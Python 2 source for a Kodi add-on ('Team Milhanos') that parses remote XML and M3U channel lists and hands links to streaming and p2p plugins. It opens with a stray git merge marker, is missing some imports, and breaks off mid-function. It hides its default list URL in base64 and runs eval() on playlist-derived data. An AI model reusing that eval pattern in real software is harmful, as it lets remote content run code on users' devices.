<<<<<<< HEAD
# -*- coding: utf-8 -*-
import urllib
import urllib2
import re
import os
import xbmcplugin
import xbmcgui
import xbmcaddon
import xbmcvfs
import traceback
import cookielib,base64
import generator
from BeautifulSoup import BeautifulStoneSoup, BeautifulSoup, BeautifulSOAP
viewmode=None
try:
    from xml.sax.saxutils import escape
except: traceback.print_exc()
try:
    import json
except:
    import simplejson as json
import SimpleDownloader as downloader
import time


tsdownloader=False

resolve_url=['180upload.com', 'allmyvideos.net', 'bestreams.net', 'clicknupload.com', 'cloudzilla.to', 'movshare.net', 'novamov.com', 'nowvideo.sx', 'videoweed.es', 'daclips.in', 'datemule.com', 'fastvideo.in', 'faststream.in', 'filehoot.com', 'filenuke.com', 'sharesix.com',  'plus.google.com', 'picasaweb.google.com', 'gorillavid.com', 'gorillavid.in', 'grifthost.com', 'hugefiles.net', 'ipithos.to', 'ishared.eu', 'kingfiles.net', 'mail.ru', 'my.mail.ru', 'videoapi.my.mail.ru', 'mightyupload.com', 'mooshare.biz', 'movdivx.com', 'movpod.net', 'movpod.in', 'movreel.com', 'mrfile.me', 'nosvideo.com', 'openload.io', 'played.to', 'bitshare.com', 'filefactory.com', 'k2s.cc', 'oboom.com', 'rapidgator.net', 'uploaded.net', 'primeshare.tv', 'bitshare.com', 'filefactory.com', 'k2s.cc', 'oboom.com', 'rapidgator.net', 'uploaded.net', 'sharerepo.com', 'stagevu.com', 'streamcloud.eu', 'streamin.to', 'thefile.me', 'thevideo.me', 'tusfiles.net', 'uploadc.com', 'zalaa.com', 'uploadrocket.net', 'uptobox.com', 'v-vids.com', 'veehd.com', 'vidbull.com', 'videomega.tv', 'vidplay.net', 'vidspot.net', 'vidto.me', 'vidzi.tv', 'vimeo.com', 'vk.com', 'vodlocker.com', 'xfileload.com', 'xvidstage.com', 'zettahost.tv']
g_ignoreSetResolved=['plugin.video.dramasonline','plugin.video.f4mTester','plugin.video.shahidmbcnet','plugin.video.SportsDevil','plugin.stream.vaughnlive.tv','plugin.video.ZemTV-shani']

class NoRedirection(urllib2.HTTPErrorProcessor):
   def http_response(self, request, response):
       return response
   https_response = http_response

REMOTE_DBG=False;
if REMOTE_DBG:
    # Make pydev debugger works for auto reload.
    # Note pydevd module need to be copied in XBMC\system\python\Lib\pysrc
    try:
        import pysrc.pydevd as pydevd
    # stdoutToServer and stderrToServer redirect stdout and stderr to eclipse console
        pydevd.settrace('localhost', stdoutToServer=True, stderrToServer=True)
    except ImportError:
        sys.stderr.write("Error: " +
            "You must add org.python.pydev.debug.pysrc to your PYTHONPATH.")
        sys.exit(1)


AddonID = xbmcaddon.Addon().getAddonInfo('id')
addon = xbmcaddon.Addon(id=AddonID) 
AddonTitle = addon.getAddonInfo('name')
addon_version = addon.getAddonInfo('version')
profile = xbmc.translatePath(addon.getAddonInfo('profile').decode('utf-8'))
home = xbmc.translatePath(addon.getAddonInfo('path').decode('utf-8'))
favorites = os.path.join(profile, 'favorites')
history = os.path.join(profile, 'history')
REV = os.path.join(profile, 'list_revision')
icon = os.path.join(home, 'icon.png')
FANART = os.path.join(home, 'fanart.jpg')
source_file = os.path.join(home, 'source_file')
functions_dir = profile
communityfiles = os.path.join(profile, 'LivewebTV')
downloader = downloader.SimpleDownloader()
debug = addon.getSetting('debug')
puerto = 'aHR0cDovL21pbGhhbm8ucHQvZnRwLW1pbGhhbm8vYWxhZG90di9UZWFtLk1pbGhhbm9zL1RlYW1fTWlsaGFub3MudHh0'.decode('base64')

if os.path.exists(favorites)==True:
    FAV = open(favorites).read()
else: FAV = []
if os.path.exists(source_file)==True:
    SOURCES = open(source_file).read()
else: SOURCES = []

SOURCES = [{"url": puerto, "fanart": "http://imgur.com/czDVMVQ"}]

def addon_log(string):
    if debug == 'true':
        xbmc.log("[addon.live.video.Team Milhanos Lists-%s]: %s" %(addon_version, string))	

def makeRequest(url, headers=None):
        try:
            if headers is None:
                headers = {'User-agent' : 'THEHOOD'}
            req = urllib2.Request(url,None,headers)
            response = urllib2.urlopen(req)
            data = response.read()
            response.close()
            return data
        except urllib2.URLError, e:
            addon_log('URL: '+url)
            if hasattr(e, 'code'):
                addon_log('We failed with error code - %s.' % e.code)
                xbmc.executebuiltin("XBMC.Notification(Team Milhanos,We failed with error code - "+str(e.code)+",10000,"+icon+")")
            elif hasattr(e, 'reason'):
                addon_log('We failed to reach a server.')
                addon_log('Reason: %s' %e.reason)
                xbmc.executebuiltin("XBMC.Notification(Team Milhanos,We failed to reach a server. - "+str(e.reason)+",10000,"+icon+")")

def getSources():
	try:
		if os.path.exists(favorites) == True:
			FAV = open(favorites).read()
			if FAV == "[]":
				os.remove(favorites)
			else:
				addDir('[COLOR blue][B]Team Milhanos Favoritos[/B][/COLOR]','url',4,os.path.join(home, 'fanart.jgp'),FANART,'','','','')


		sources = SOURCES
                if len(sources) > 1:
                    for i in sources:
                        try:
                            ## for pre 1.0.8 sources
                            if isinstance(i, list):
                                addDir(i[0].encode('utf-8'),i[1].encode('utf-8'),1,icon,FANART,'','','','','source')
                            else:
                                thumb = icon
                                fanart = FANART
                                desc = ''
                                date = ''
                                credits = ''
                                genre = ''
                                if i.has_key('thumbnail'):
                                    thumb = i['thumbnail']
                                if i.has_key('fanart'):
                                    fanart = i['fanart']
                                if i.has_key('description'):
                                    desc = i['description']
                                if i.has_key('date'):
                                    date = i['date']
                                if i.has_key('genre'):
                                    genre = i['genre']
                                if i.has_key('credits'):
                                    credits = i['credits']
                                addDir(i['title'].encode('utf-8'),i['url'].encode('utf-8'),1,thumb,fanart,desc,genre,date,credits,'source')
                        except: traceback.print_exc()
                else:
                    if len(sources) == 1:
                        if isinstance(sources[0], list):
                            getData(sources[0][1].encode('utf-8'),FANART)
                        else:
                            getData(sources[0]['url'], sources[0]['fanart'])
        except: traceback.print_exc()


def addSource(url=None):
        if url is None:
            if not addon.getSetting("new_file_source") == "":
               source_url = addon.getSetting('new_file_source').decode('utf-8')
            elif not addon.getSetting("new_url_source") == "":
               source_url = addon.getSetting('new_url_source').decode('utf-8')
        else:
            source_url = url
        if source_url == '' or source_url is None:
            return
        addon_log('Adding New Source: '+source_url.encode('utf-8'))

        media_info = None
        #print 'source_url',source_url
        data = getSoup(source_url)
        print 'source_url',source_url       
        if isinstance(data,BeautifulSOAP):
            if data.find('channels_info'):
                media_info = data.channels_info
            elif data.find('items_info'):
                media_info = data.items_info
        if media_info:
            source_media = {}
            source_media['url'] = source_url
            try: source_media['title'] = media_info.title.string
            except: pass
            try: source_media['thumbnail'] = media_info.thumbnail.string
            except: pass
            try: source_media['fanart'] = media_info.fanart.string
            except: pass
            try: source_media['genre'] = media_info.genre.string
            except: pass
            try: source_media['description'] = media_info.description.string
            except: pass
            try: source_media['date'] = media_info.date.string
            except: pass
            try: source_media['credits'] = media_info.credits.string
            except: pass
        else:
            if '/' in source_url:
                nameStr = source_url.split('/')[-1].split('.')[0]
            if '\\' in source_url:
                nameStr = source_url.split('\\')[-1].split('.')[0]
            if '%' in nameStr:
                nameStr = urllib.unquote_plus(nameStr)
            keyboard = xbmc.Keyboard(nameStr,'Displayed Name, Rename?')
            keyboard.doModal()
            if (keyboard.isConfirmed() == False):
                return
            newStr = keyboard.getText()
            if len(newStr) == 0:
                return
            source_media = {}
            source_media['title'] = newStr
            source_media['url'] = source_url
            source_media['fanart'] = fanart

        if os.path.exists(source_file)==False:
            source_list = []
            source_list.append(source_media)
            b = open(source_file,"w")
            b.write(json.dumps(source_list))
            b.close()
        else:
            sources = json.loads(open(source_file,"r").read())
            sources.append(source_media)
            b = open(source_file,"w")
            b.write(json.dumps(sources))
            b.close()
        addon.setSetting('new_url_source', "")
        addon.setSetting('new_file_source', "")
        xbmc.executebuiltin("XBMC.Notification(Team Milhanos,New source added.,5000,"+icon+")")
        if not url is None:
            if 'xbmcplus.xb.funpic.de' in url:
                xbmc.executebuiltin("XBMC.Container.Update(%s?mode=14,replace)" %sys.argv[0])
            elif 'community-links' in url:
                xbmc.executebuiltin("XBMC.Container.Update(%s?mode=10,replace)" %sys.argv[0])
        else: addon.openSettings()


def rmSource(name):
        sources = json.loads(open(source_file,"r").read())
        for index in range(len(sources)):
            if isinstance(sources[index], list):
                if sources[index][0] == name:
                    del sources[index]
                    b = open(source_file,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
            else:
                if sources[index]['title'] == name:
                    del sources[index]
                    b = open(source_file,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
        xbmc.executebuiltin("XBMC.Container.Refresh")


def get_xml_database(url, browse=False):
        if url is None:
            url = 'http://xbmcplus.xb.funpic.de/www-data/filesystem/'
        soup = BeautifulSoup(makeRequest(url), convertEntities=BeautifulSoup.HTML_ENTITIES)
        for i in soup('a'):
            href = i['href']
            if not href.startswith('?'):
                name = i.string
                if name not in ['Parent Directory', 'recycle_bin/']:
                    if href.endswith('/'):
                        if browse:
                            addDir(name,url+href,15,icon,fanart,'','','')
                        else:
                            addDir(name,url+href,14,icon,fanart,'','','')
                    elif href.endswith('.xml'):
                        if browse:
                            addDir(name,url+href,1,icon,fanart,'','','','','download')
                        else:
                            if os.path.exists(source_file)==True:
                                if name in SOURCES:
                                    addDir(name+' (in use)',url+href,11,icon,fanart,'','','','','download')
                                else:
                                    addDir(name,url+href,11,icon,fanart,'','','','','download')
                            else:
                                addDir(name,url+href,11,icon,fanart,'','','','','download')


def getCommunitySources(browse=False):
        url = 'http://community-links.googlecode.com/svn/trunk/'
        soup = BeautifulSoup(makeRequest(url), convertEntities=BeautifulSoup.HTML_ENTITIES)
        files = soup('ul')[0]('li')[1:]
        for i in files:
            name = i('a')[0]['href']
            if browse:
                addDir(name,url+name,1,icon,fanart,'','','','','download')
            else:
                addDir(name,url+name,11,icon,fanart,'','','','','download')


def getSoup(url,data=None):
        global viewmode,tsdownloader
        tsdownloader=False
        if url.startswith('http://') or url.startswith('https://'):
            enckey=False
            if '$$TSDOWNLOADER$$' in url:
                tsdownloader=True
                url=url.replace("$$TSDOWNLOADER$$","")
            if '$$LSProEncKey=' in url:
                enckey=url.split('$$LSProEncKey=')[1].split('$$')[0]
                rp='$$LSProEncKey=%s$$'%enckey
                url=url.replace(rp,"")
                
            data =makeRequest(url)
            if enckey:
                    import pyaes
                    enckey=enckey.encode("ascii")
                    print enckey
                    missingbytes=16-len(enckey)
                    enckey=enckey+(chr(0)*(missingbytes))
                    print repr(enckey)
                    data=base64.b64decode(data)
                    decryptor = pyaes.new(enckey , pyaes.MODE_ECB, IV=None)
                    data=decryptor.decrypt(data).split('\0')[0]
                    #print repr(data)
            if re.search("#EXTM3U",data) or 'm3u' in url:
#                print 'found m3u data'
                return data
        elif data == None:
            if not '/'  in url or not '\\' in url:
#                print 'No directory found. Lets make the url to cache dir'
                url = os.path.join(communityfiles,url)
            if xbmcvfs.exists(url):
                if url.startswith("smb://") or url.startswith("nfs://"):
                    copy = xbmcvfs.copy(url, os.path.join(profile, 'temp', 'sorce_temp.txt'))
                    if copy:
                        data = open(os.path.join(profile, 'temp', 'sorce_temp.txt'), "r").read()
                        xbmcvfs.delete(os.path.join(profile, 'temp', 'sorce_temp.txt'))
                    else:
                        addon_log("failed to copy from smb:")
                else:
                    data = open(url, 'r').read()
                    if re.match("#EXTM3U",data)or 'm3u' in url:
#                        print 'found m3u data'
                        return data
            else:
                addon_log("Soup Data not found!")
                return
        if '<SetViewMode>' in data:
            try:
                viewmode=re.findall('<SetViewMode>(.*?)<',data)[0]
                xbmc.executebuiltin("Container.SetViewMode(%s)"%viewmode)
                print 'done setview',viewmode
            except: pass
        return BeautifulSOAP(data, convertEntities=BeautifulStoneSoup.XML_ENTITIES)


def getData(url,fanart, data=None):
    soup = getSoup(url,data)
    #print type(soup)
    if isinstance(soup,BeautifulSOAP):
    #print 'xxxxxxxxxxsoup',soup
        if len(soup('channels')) > 0 and addon.getSetting('donotshowbychannels') == 'false':
            channels = soup('channel')
            for channel in channels:
#                print channel

                linkedUrl=''
                lcount=0
                try:
                    linkedUrl =  channel('externallink')[0].string
                    lcount=len(channel('externallink'))
                except: pass
                #print 'linkedUrl',linkedUrl,lcount
                if lcount>1: linkedUrl=''

                name = channel('name')[0].string
                thumbnail = channel('thumbnail')[0].string
                if thumbnail == None:
                    thumbnail = ''

                try:
                    if not channel('fanart'):
                        if addon.getSetting('use_thumb') == "true":
                            fanArt = thumbnail
                        else:
                            fanArt = fanart
                    else:
                        fanArt = channel('fanart')[0].string
                    if fanArt == None:
                        raise
                except:
                    fanArt = fanart

                try:
                    desc = channel('info')[0].string
                    if desc == None:
                        raise
                except:
                    desc = ''

                try:
                    genre = channel('genre')[0].string
                    if genre == None:
                        raise
                except:
                    genre = ''

                try:
                    date = channel('date')[0].string
                    if date == None:
                        raise
                except:
                    date = ''

                try:
                    credits = channel('credits')[0].string
                    if credits == None:
                        raise
                except:
                    credits = ''

                try:
                    if linkedUrl=='':
                        addDir(name.encode('utf-8', 'ignore'),url.encode('utf-8'),2,thumbnail,fanArt,desc,genre,date,credits,True)
                    else:
                        #print linkedUrl
                        addDir(name.encode('utf-8'),linkedUrl.encode('utf-8'),1,thumbnail,fanArt,desc,genre,date,None,'source')
                except:
                    addon_log('There was a problem adding directory from getData(): '+name.encode('utf-8', 'ignore'))
        else:
            addon_log('No Channels: getItems')
            getItems(soup('item'),fanart)
    else:
        parse_m3u(soup)


def parse_m3u(data):
    content = data.rstrip()
    match = re.compile(r'#EXTINF:(.+?),(.*?)[\n\r]+([^\r\n]+)').findall(content)
    total = len(match)
    print 'tsdownloader',tsdownloader
#    print 'total m3u links',total
    for other,channel_name,stream_url in match:
        
        if 'tvg-logo' in other:
            thumbnail = re_me(other,'tvg-logo=[\'"](.*?)[\'"]')
            if thumbnail:
                if thumbnail.startswith('http'):
                    thumbnail = thumbnail

                elif not addon.getSetting('logo-folderPath') == "":
                    logo_url = addon.getSetting('logo-folderPath')
                    thumbnail = logo_url + thumbnail

                else:
                    thumbnail = thumbnail
            #else:

        else:
            thumbnail = ''
        
        if 'type' in other:
            mode_type = re_me(other,'type=[\'"](.*?)[\'"]')
            if mode_type == 'yt-dl':
                stream_url = stream_url +"&mode=18"
            elif mode_type == 'regex':
                url = stream_url.split('&regexs=')
                #print url[0] getSoup(url,data=None)
                regexs = parse_regex(getSoup('',data=url[1]))

                addLink(url[0], channel_name,thumbnail,'','','','','',None,regexs,total)
                continue
            elif mode_type == 'ftv':
                stream_url = 'plugin://plugin.video.F.T.V/?name='+urllib.quote(channel_name) +'&url=' +stream_url +'&mode=125&ch_fanart=na'
        elif tsdownloader and '.ts' in stream_url:
            stream_url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(stream_url)+'&amp;streamtype=TSDOWNLOADER&name='+urllib.quote(channel_name)
        addLink(stream_url, channel_name,thumbnail,'','','','','',None,'',total)


def getChannelItems(name,url,fanart):
        soup = getSoup(url)
        channel_list = soup.find('channel', attrs={'name' : name.decode('utf-8')})
        items = channel_list('item')
        try:
            fanArt = channel_list('fanart')[0].string
            if fanArt == None:
                raise
        except:
            fanArt = fanart
        for channel in channel_list('subchannel'):
            name = channel('name')[0].string
            try:
                thumbnail = channel('thumbnail')[0].string
                if thumbnail == None:
                    raise
            except:
                thumbnail = ''
            try:
                if not channel('fanart'):
                    if addon.getSetting('use_thumb') == "true":
                        fanArt = thumbnail
                else:
                    fanArt = channel('fanart')[0].string
                if fanArt == None:
                    raise
            except:
                pass
            try:
                desc = channel('info')[0].string
                if desc == None:
                    raise
            except:
                desc = ''

            try:
                genre = channel('genre')[0].string
                if genre == None:
                    raise
            except:
                genre = ''

            try:
                date = channel('date')[0].string
                if date == None:
                    raise
            except:
                date = ''

            try:
                credits = channel('credits')[0].string
                if credits == None:
                    raise
            except:
                credits = ''

            try:
                addDir(name.encode('utf-8', 'ignore'),url.encode('utf-8'),3,thumbnail,fanArt,desc,genre,credits,date)
            except:
                addon_log('There was a problem adding directory - '+name.encode('utf-8', 'ignore'))
        getItems(items,fanArt)


def getSubChannelItems(name,url,fanart):
        soup = getSoup(url)
        channel_list = soup.find('subchannel', attrs={'name' : name.decode('utf-8')})
        items = channel_list('subitem')
        getItems(items,fanart)


def getItems(items,fanart,dontLink=False):
        total = len(items)
        addon_log('Total Items: %s' %total)
        add_playlist = addon.getSetting('add_playlist')
        ask_playlist_items =addon.getSetting('ask_playlist_items')
        use_thumb = addon.getSetting('use_thumb')
        parentalblock =addon.getSetting('parentalblocked')
        parentalblock= parentalblock=="true"
        for item in items:
            isXMLSource=False
            isJsonrpc = False
            
            applyblock='false'
            try:
                applyblock = item('parentalblock')[0].string
            except:
                addon_log('parentalblock Error')
                applyblock = ''
            if applyblock=='true' and parentalblock: continue
                
            try:
                name = item('title')[0].string
                if name is None:
                    name = 'unknown?'
            except:
                addon_log('Name Error')
                name = ''


            try:
                if item('epg'):
                    if item.epg_url:
                        addon_log('Get EPG Regex')
                        epg_url = item.epg_url.string
                        epg_regex = item.epg_regex.string
                        epg_name = get_epg(epg_url, epg_regex)
                        if epg_name:
                            name += ' - ' + epg_name
                    elif item('epg')[0].string > 1:
                        name += getepg(item('epg')[0].string)
                else:
                    pass
            except:
                addon_log('EPG Error')
            try:
                url = []
                if len(item('link')) >0:
                    #print 'item link', item('link')

                    for i in item('link'):
                        if not i.string == None:
                            url.append(i.string)

                elif len(item('sportsdevil')) >0:
                    for i in item('sportsdevil'):
                        if not i.string == None:
                            sportsdevil = 'plugin://plugin.video.SportsDevil/?mode=1&amp;item=catcher%3dstreams%26url=' +i.string
                            referer = item('referer')[0].string
                            if referer:
                                #print 'referer found'
                                sportsdevil = sportsdevil + '%26referer=' +referer
                            url.append(sportsdevil)
                elif len(item('p2p')) >0:
                    for i in item('p2p'):
                        if not i.string == None:
                            if 'sop://' in i.string:
                                sop = 'plugin://plugin.video.p2p-streams/?mode=2url='+i.string +'&' + 'name='+name
                                url.append(sop)
                            else:
                                p2p='plugin://plugin.video.p2p-streams/?mode=1&url='+i.string +'&' + 'name='+name
                                url.append(p2p)
                elif len(item('vaughn')) >0:
                    for i in item('vaughn'):
                        if not i.string == None:
                            vaughn = 'plugin://plugin.stream.vaughnlive.tv/?mode=PlayLiveStream&amp;channel='+i.string
                            url.append(vaughn)
                elif len(item('ilive')) >0:
                    for i in item('ilive'):
                        if not i.string == None:
                            if not 'http' in i.string:
                                ilive = 'plugin://plugin.video.tbh.ilive/?url=http://www.streamlive.to/view/'+i.string+'&amp;link=99&amp;mode=iLivePlay'
                            else:
                                ilive = 'plugin://plugin.video.tbh.ilive/?url='+i.string+'&amp;link=99&amp;mode=iLivePlay'
                elif len(item('yt-dl')) >0:
                    for i in item('yt-dl'):
                        if not i.string == None:
                            ytdl = i.string + '&mode=18'
                            url.append(ytdl)
                elif len(item('dm')) >0:
                    for i in item('dm'):
                        if not i.string == None:
                            dm = "plugin://plugin.video.dailymotion_com/?mode=playVideo&url=" + i.string
                            url.append(dm)
                elif len(item('dmlive')) >0:
                    for i in item('dmlive'):
                        if not i.string == None:
                            dm = "plugin://plugin.video.dailymotion_com/?mode=playLiveVideo&url=" + i.string
                            url.append(dm)
                elif len(item('utube')) >0:
                    for i in item('utube'):
                        if not i.string == None:
                            if ' ' in i.string :
                                utube = 'plugin://plugin.video.youtube/search/?q='+ urllib.quote_plus(i.string)
                                isJsonrpc=utube
                            elif len(i.string) == 11:
                                utube = 'plugin://plugin.video.youtube/play/?video_id='+ i.string
                            elif (i.string.startswith('PL') and not '&order=' in i.string) or i.string.startswith('UU'):
                                utube = 'plugin://plugin.video.youtube/play/?&order=default&playlist_id=' + i.string
                            elif i.string.startswith('PL') or i.string.startswith('UU'):
                                utube = 'plugin://plugin.video.youtube/play/?playlist_id=' + i.string
                            elif i.string.startswith('UC') and len(i.string) > 12:
                                utube = 'plugin://plugin.video.youtube/channel/' + i.string + '/'
                                isJsonrpc=utube
                            elif not i.string.startswith('UC') and not (i.string.startswith('PL'))  :
                                utube = 'plugin://plugin.video.youtube/user/' + i.string + '/'
                                isJsonrpc=utube
                        url.append(utube)
                elif len(item('imdb')) >0:
                    for i in item('imdb'):
                        if not i.string == None:
                            if addon.getSetting('genesisorpulsar') == '0':
                                imdb = 'plugin://plugin.video.genesis/?action=play&imdb='+i.string
                            else:
                                imdb = 'plugin://plugin.video.pulsar/movie/tt'+i.string+'/play'
                            url.append(imdb)
                elif len(item('f4m')) >0:
                        for i in item('f4m'):
                            if not i.string == None:
                                if '.f4m' in i.string:
                                    f4m = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(i.string)
                                elif '.m3u8' in i.string:
                                    f4m = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(i.string)+'&amp;streamtype=HLS'

                                else:
                                    f4m = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(i.string)+'&amp;streamtype=SIMPLE'
                            url.append(f4m)
                elif len(item('ftv')) >0:
                    for i in item('ftv'):
                        if not i.string == None:
                            ftv = 'plugin://plugin.video.F.T.V/?name='+urllib.quote(name) +'&url=' +i.string +'&mode=125&ch_fanart=na'
                        url.append(ftv)
                elif len(item('urlsolve')) >0:
                    
                    for i in item('urlsolve'):
                        if not i.string == None:
                            resolver = i.string +'&mode=19'
                            url.append(resolver)
                if len(url) < 1:
                    raise
            except:
                addon_log('Error <link> element, Passing:'+name.encode('utf-8', 'ignore'))
                continue
            try:
                isXMLSource = item('externallink')[0].string
            except: pass

            if isXMLSource:
                ext_url=[isXMLSource]
                isXMLSource=True
            else:
                isXMLSource=False
            try:
                isJsonrpc = item('jsonrpc')[0].string
            except: pass
            if isJsonrpc:

                ext_url=[isJsonrpc]
                #print 'JSON-RPC ext_url',ext_url
                isJsonrpc=True
            else:
                isJsonrpc=False
            try:
                thumbnail = item('thumbnail')[0].string
                if thumbnail == None:
                    raise
            except:
                thumbnail = ''
            try:
                if not item('fanart'):
                    if addon.getSetting('use_thumb') == "true":
                        fanArt = thumbnail
                    else:
                        fanArt = fanart
                else:
                    fanArt = item('fanart')[0].string
                if fanArt == None:
                    raise
            except:
                fanArt = fanart
            try:
                desc = item('info')[0].string
                if desc == None:
                    raise
            except:
                desc = ''

            try:
                genre = item('genre')[0].string
                if genre == None:
                    raise
            except:
                genre = ''

            try:
                date = item('date')[0].string
                if date == None:
                    raise
            except:
                date = ''

            regexs = None
            if item('regex'):
                try:
                    reg_item = item('regex')
                    regexs = parse_regex(reg_item)
                except:
                    pass
            try:
                
                if len(url) > 1:
                    alt = 0
                    playlist = []
                    for i in url:
                            if  add_playlist == "false":
                                alt += 1
                                addLink(i,'%s) %s' %(alt, name.encode('utf-8', 'ignore')),thumbnail,fanArt,desc,genre,date,True,playlist,regexs,total)
                            elif  add_playlist == "true" and  ask_playlist_items == 'true':
                                if regexs:
                                    playlist.append(i+'&regexs='+regexs)
                                elif  any(x in i for x in resolve_url) and  i.startswith('http'):
                                    playlist.append(i+'&mode=19')
                                else:
                                    playlist.append(i)
                            else:
                                playlist.append(i)
                    if len(playlist) > 1:
                        addLink('', name,thumbnail,fanArt,desc,genre,date,True,playlist,regexs,total)
                else:
                    
                    if dontLink:
                        return name,url[0],regexs
                    if isXMLSource:
                            if not regexs == None: #<externallink> and <regex>
                                addDir(name.encode('utf-8'),ext_url[0].encode('utf-8'),1,thumbnail,fanart,desc,genre,date,None,'!!update',regexs,url[0].encode('utf-8'))
                                #addLink(url[0],name.encode('utf-8', 'ignore')+  '[COLOR yellow]build XML[/COLOR]',thumbnail,fanArt,desc,genre,date,True,None,regexs,total)
                            else:
                                addDir(name.encode('utf-8'),ext_url[0].encode('utf-8'),1,thumbnail,fanart,desc,genre,date,None,'source',None,None)
                                #addDir(name.encode('utf-8'),url[0].encode('utf-8'),1,thumbnail,fanart,desc,genre,date,None,'source')
                    elif isJsonrpc:
                        addDir(name.encode('utf-8'),ext_url[0],53,thumbnail,fanart,desc,genre,date,None,'source')
                        #xbmc.executebuiltin("Container.SetViewMode(500)")
                    else:
                        
                        addLink(url[0],name.encode('utf-8', 'ignore'),thumbnail,fanArt,desc,genre,date,True,None,regexs,total)
                    #print 'success'
            except:
                addon_log('There was a problem adding item - '+name.encode('utf-8', 'ignore'))


def parse_regex(reg_item):
                try:
                    regexs = {}
                    for i in reg_item:
                        regexs[i('name')[0].string] = {}
                        regexs[i('name')[0].string]['name']=i('name')[0].string
                        #regexs[i('name')[0].string]['expres'] = i('expres')[0].string
                        try:
                            regexs[i('name')[0].string]['expres'] = i('expres')[0].string
                            if not regexs[i('name')[0].string]['expres']:
                                regexs[i('name')[0].string]['expres']=''
                        except:
                            addon_log("Regex: -- No Referer --")
                        regexs[i('name')[0].string]['page'] = i('page')[0].string
                        try:
                            regexs[i('name')[0].string]['referer'] = i('referer')[0].string
                        except:
                            addon_log("Regex: -- No Referer --")
                        try:
                            regexs[i('name')[0].string]['connection'] = i('connection')[0].string
                        except:
                            addon_log("Regex: -- No connection --")

                        try:
                            regexs[i('name')[0].string]['notplayable'] = i('notplayable')[0].string
                        except:
                            addon_log("Regex: -- No notplayable --")

                        try:
                            regexs[i('name')[0].string]['noredirect'] = i('noredirect')[0].string
                        except:
                            addon_log("Regex: -- No noredirect --")
                        try:
                            regexs[i('name')[0].string]['origin'] = i('origin')[0].string
                        except:
                            addon_log("Regex: -- No origin --")
                        try:
                            regexs[i('name')[0].string]['accept'] = i('accept')[0].string
                        except:
                            addon_log("Regex: -- No accept --")
                        try:
                            regexs[i('name')[0].string]['includeheaders'] = i('includeheaders')[0].string
                        except:
                            addon_log("Regex: -- No includeheaders --")

                            
                        try:
                            regexs[i('name')[0].string]['listrepeat'] = i('listrepeat')[0].string
#                            print 'listrepeat',regexs[i('name')[0].string]['listrepeat'],i('listrepeat')[0].string, i
                        except:
                            addon_log("Regex: -- No listrepeat --")
                    
                            

                        try:
                            regexs[i('name')[0].string]['proxy'] = i('proxy')[0].string
                        except:
                            addon_log("Regex: -- No proxy --")
                            
                        try:
                            regexs[i('name')[0].string]['x-req'] = i('x-req')[0].string
                        except:
                            addon_log("Regex: -- No x-req --")

                        try:
                            regexs[i('name')[0].string]['x-addr'] = i('x-addr')[0].string
                        except:
                            addon_log("Regex: -- No x-addr --")                            
                            
                        try:
                            regexs[i('name')[0].string]['x-forward'] = i('x-forward')[0].string
                        except:
                            addon_log("Regex: -- No x-forward --")

                        try:
                            regexs[i('name')[0].string]['agent'] = i('agent')[0].string
                        except:
                            addon_log("Regex: -- No User Agent --")
                        try:
                            regexs[i('name')[0].string]['post'] = i('post')[0].string
                        except:
                            addon_log("Regex: -- Not a post")
                        try:
                            regexs[i('name')[0].string]['rawpost'] = i('rawpost')[0].string
                        except:
                            addon_log("Regex: -- Not a rawpost")
                        try:
                            regexs[i('name')[0].string]['htmlunescape'] = i('htmlunescape')[0].string
                        except:
                            addon_log("Regex: -- Not a htmlunescape")


                        try:
                            regexs[i('name')[0].string]['readcookieonly'] = i('readcookieonly')[0].string
                        except:
                            addon_log("Regex: -- Not a readCookieOnly")
                        #print i
                        try:
                            regexs[i('name')[0].string]['cookiejar'] = i('cookiejar')[0].string
                            if not regexs[i('name')[0].string]['cookiejar']:
                                regexs[i('name')[0].string]['cookiejar']=''
                        except:
                            addon_log("Regex: -- Not a cookieJar")
                        try:
                            regexs[i('name')[0].string]['setcookie'] = i('setcookie')[0].string
                        except:
                            addon_log("Regex: -- Not a setcookie")
                        try:
                            regexs[i('name')[0].string]['appendcookie'] = i('appendcookie')[0].string
                        except:
                            addon_log("Regex: -- Not a appendcookie")

                        try:
                            regexs[i('name')[0].string]['ignorecache'] = i('ignorecache')[0].string
                        except:
                            addon_log("Regex: -- no ignorecache")
                        #try:
                        #    regexs[i('name')[0].string]['ignorecache'] = i('ignorecache')[0].string
                        #except:
                        #    addon_log("Regex: -- no ignorecache")

                    regexs = urllib.quote(repr(regexs))
                    return regexs
                    #print regexs
                except:
                    regexs = None
                    addon_log('regex Error: '+name.encode('utf-8', 'ignore'))


def get_ustream(url):
    try:
        for i in range(1, 51):
            result = getUrl(url)
            if "EXT-X-STREAM-INF" in result: return url
            if not "EXTM3U" in result: return
            xbmc.sleep(2000)
        return
    except:
        return


def getRegexParsed(regexs, url,cookieJar=None,forCookieJarOnly=False,recursiveCall=False,cachedPages={}, rawPost=False, cookie_jar_file=None):#0,1,2 = URL, regexOnly, CookieJarOnly
        if not recursiveCall:
            regexs = eval(urllib.unquote(regexs))
        #cachedPages = {}
        #print 'url',url
        doRegexs = re.compile('\$doregex\[([^\]]*)\]').findall(url)
#        print 'doRegexs',doRegexs,regexs
        setresolved=True
        for k in doRegexs:
            if k in regexs:
                #print 'processing ' ,k
                m = regexs[k]
                #print m
                cookieJarParam=False
                if  'cookiejar' in m: # so either create or reuse existing jar
                    #print 'cookiejar exists',m['cookiejar']
                    cookieJarParam=m['cookiejar']
                    if  '$doregex' in cookieJarParam:
                        cookieJar=getRegexParsed(regexs, m['cookiejar'],cookieJar,True, True,cachedPages)
                        cookieJarParam=True
                    else:
                        cookieJarParam=True
                #print 'm[cookiejar]',m['cookiejar'],cookieJar
                if cookieJarParam:
                    if cookieJar==None:
                        #print 'create cookie jar'
                        cookie_jar_file=None
                        if 'open[' in m['cookiejar']:
                            cookie_jar_file=m['cookiejar'].split('open[')[1].split(']')[0]
#                            print 'cookieJar from file name',cookie_jar_file

                        cookieJar=getCookieJar(cookie_jar_file)
#                        print 'cookieJar from file',cookieJar
                        if cookie_jar_file:
                            saveCookieJar(cookieJar,cookie_jar_file)
                        #import cookielib
                        #cookieJar = cookielib.LWPCookieJar()
                        #print 'cookieJar new',cookieJar
                    elif 'save[' in m['cookiejar']:
                        cookie_jar_file=m['cookiejar'].split('save[')[1].split(']')[0]
